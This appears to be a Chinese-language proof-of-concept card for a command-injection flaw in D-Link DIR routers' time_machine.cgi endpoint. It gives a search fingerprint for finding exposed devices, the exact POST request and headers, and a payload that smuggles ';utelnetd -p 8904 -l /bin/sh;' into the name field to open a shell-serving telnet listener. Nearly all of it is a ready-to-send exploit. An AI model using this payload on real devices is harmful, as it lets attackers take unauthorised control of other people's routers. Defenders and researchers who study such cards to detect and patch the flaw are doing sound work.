# D-Linktime_machine.cgi存在命令执行漏洞

- **系统**：D-Linktime_machine.cgi　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`"D-Link-DIR"`
- **请求**：`POST /cgi-bin/time_machine.cgi HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`X-Requested-With: XMLHttpRequest`　`Content-Length: 52`　`Cookie: username=admin`　`Priority: u=0`

**请求体 / payload**
```
cmd=cgi_tm_del_share&name=;utelnetd -p 8904 -l /bin/sh;
```
- **预期**：200　|　—